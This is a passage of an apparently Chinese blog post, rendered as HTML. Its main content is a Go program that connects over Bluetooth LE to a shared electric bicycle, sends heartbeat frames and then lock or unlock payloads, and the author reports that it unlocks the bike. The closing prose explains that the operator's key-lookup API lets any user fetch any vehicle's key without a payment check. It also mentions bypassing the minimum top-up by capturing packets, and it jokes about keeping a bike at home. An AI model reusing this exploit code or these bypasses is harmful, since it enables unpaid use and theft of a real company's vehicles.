+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> readCharacteristic <span style="color:#ff7b72;font-weight:bold">*</span>ble.Characteristic
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> writeCharacteristic <span style="color:#ff7b72;font-weight:bold">*</span>ble.Characteristic
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">for</span> _, characteristic <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#ff7b72">range</span> characteristics {
+</span></span><span style="display:flex;"><span> characteristic <span style="color:#ff7b72;font-weight:bold">:=</span> characteristic
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> characteristic.Property <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">18</span> {
+</span></span><span style="display:flex;"><span> readCharacteristic = characteristic
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> characteristic.Property <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">22</span> {
+</span></span><span style="display:flex;"><span> writeCharacteristic = characteristic
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#8b949e;font-style:italic">// 18 - read, 20 - write</span>
+</span></span><span style="display:flex;"><span> fmt.<span style="color:#d2a8ff;font-weight:bold">Println</span>(characteristic.UUID.<span style="color:#d2a8ff;font-weight:bold">String</span>())
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">:=</span> client.<span style="color:#d2a8ff;font-weight:bold">Subscribe</span>(readCharacteristic, <span style="color:#79c0ff">false</span>, <span style="color:#ff7b72">func</span>(req []<span style="color:#ff7b72">byte</span>) {
+</span></span><span style="display:flex;"><span> fmt.<span style="color:#d2a8ff;font-weight:bold">Println</span>(<span style="color:#a5d6ff">&#34;response: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> string(req))
+</span></span><span style="display:flex;"><span> }); err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(err)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> unlock <span style="color:#ff7b72;font-weight:bold">:=</span> []<span style="color:#ff7b72">byte</span>{<span style="color:#a5d6ff">170</span>, <span style="color:#a5d6ff">&#39;R&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">&#39;A&#39;</span>, <span style="color:#a5d6ff">&#39;C&#39;</span>, <span style="color:#a5d6ff">&#39;T&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">3</span>, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">0</span>}
+</span></span><span style="display:flex;"><span> lock <span style="color:#ff7b72;font-weight:bold">:=</span> []<span style="color:#ff7b72">byte</span>{<span style="color:#a5d6ff">170</span>, <span style="color:#a5d6ff">&#39;R&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">&#39;A&#39;</span>, <span style="color:#a5d6ff">&#39;C&#39;</span>, <span style="color:#a5d6ff">&#39;T&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">3</span>, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">1</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> heartBeats <span style="color:#ff7b72;font-weight:bold">:=</span> [][]<span style="color:#ff7b72">byte</span>{
+</span></span><span style="display:flex;"><span> {<span style="color:#a5d6ff">170</span>, <span style="color:#a5d6ff">&#39;R&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">&#39;A&#39;</span>, <span style="color:#a5d6ff">&#39;C&#39;</span>, <span style="color:#a5d6ff">&#39;T&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">2</span>, <span style="color:#a5d6ff">0</span>, <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">32</span>, <span style="color:#a5d6ff">10</span>, <span style="color:#a5d6ff">172</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">246</span>, <span style="color:#a5d6ff">82</span>, <span style="color:#a5d6ff">185</span>, <span style="color:#a5d6ff">236</span>, <span style="color:#a5d6ff">169</span>, <span style="color:#a5d6ff">10</span>},
+</span></span><span style="display:flex;"><span> {<span style="color:#a5d6ff">216</span>, <span style="color:#a5d6ff">&#39;R&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">&#39;A&#39;</span>, <span style="color:#a5d6ff">&#39;C&#39;</span>, <span style="color:#a5d6ff">&#39;T&#39;</span>, <span style="color:#a5d6ff">&#39;E&#39;</span>, <span style="color:#a5d6ff">&#39;D&#39;</span>, <span style="color:#a5d6ff">130</span>, <span style="color:#a5d6ff">42</span>, <span style="color:#a5d6ff">86</span>, <span style="color:#a5d6ff">39</span>, <span style="color:#a5d6ff">22</span>, <span style="color:#a5d6ff">190</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#a5d6ff">18</span>, <span style="color:#a5d6ff">174</span>, <span style="color:#a5d6ff">90</span>, <span style="color:#a5d6ff">66</span>, <span style="color:#a5d6ff">71</span>, <span style="color:#a5d6ff">56</span>},
+</span></span><span style="display:flex;"><span> {<span style="color:#a5d6ff">135</span>, <span style="color:#a5d6ff">160</span>, <span style="color:#a5d6ff">58</span>, <span style="color:#a5d6ff">30</span>},
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">var</span> data []<span style="color:#ff7b72">byte</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> mode <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">&#34;lock&#34;</span> {
+</span></span><span style="display:flex;"><span> data = lock
+</span></span><span style="display:flex;"><span> } <span style="color:#ff7b72">else</span> {
+</span></span><span style="display:flex;"><span> data = unlock
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> payloads <span style="color:#ff7b72;font-weight:bold">:=</span> append(heartBeats, data)
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">for</span> _, p <span style="color:#ff7b72;font-weight:bold">:=</span> <span style="color:#ff7b72">range</span> payloads {
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">:=</span> client.<span style="color:#d2a8ff;font-weight:bold">WriteCharacteristic</span>(writeCharacteristic, p, <span style="color:#79c0ff">true</span>); err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(err)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> time.<span style="color:#d2a8ff;font-weight:bold">Sleep</span>(<span style="color:#a5d6ff">200</span> <span style="color:#ff7b72;font-weight:bold">*</span> time.Millisecond)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72">if</span> err <span style="color:#ff7b72;font-weight:bold">:=</span> client.<span style="color:#d2a8ff;font-weight:bold">CancelConnection</span>(); err <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#79c0ff">nil</span> {
+</span></span><span style="display:flex;"><span> panic(err)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff7b72;font-weight:bold">&lt;-</span>client.<span style="color:#d2a8ff;font-weight:bold">Disconnected</span>()
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>编译运行该 Go 程序，程序蓝牙找到共享电单车然后就开锁了~</p>
+<div class="container">
+<div id="player-wrapper" class=""></div>
+</div>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@clappr/player@latest/dist/clappr.min.js">
+</script>
+<script>
+var playerElement = document.getElementById("player-wrapper");
+var player = new Clappr.Player({
+source: "/images/2023/08/hack-electric-bicycle.mp4",
+mute: true,
+height: 360,
+width: 640
+});
+player.attachTo(playerElement);
+</script>
+<p>效果还是相当帅的。</p>
+<h2 id="最后说几句">最后说几句</h2>
+<p>所以综上，这个共享电单车最大的问题就是那个查询车辆秘钥的接口存在水平越权，可以获取任意车辆的秘钥进行开锁，而没有确认用户的支付状态。之前也尝试看过酒店房间里的蓝牙自动贩卖机，有的是会校验商品的购买状态，并且每一次开锁的 Secret 都会变，有的就无脑中间人抓包改下就行，连 Secret 都没有。
+同时，文章开头提到的小程序 20 元起充，其实抓个包也能很简单的 bypass。</p>
+<p>但我是遵纪守法的好市民，我现在出门也还是老老实实地扫码充值骑车哦，等后面买车了其实也用不上那些共享电单车了。嘻嘻。</p>
+<p>话说我搞完这些后，抬回家的共享电单车一直停在楼道懒得再抬下去还掉。拖到最后，这块片区的运营给我的手机又是发短信又是电话，问我住哪，然后亲自上来把停在楼道的电单车搬走了，给我吓得以为来查水表了。看来私自改车锁车藏车在他们眼里已经见怪不怪了&hellip;&hellip;</p>
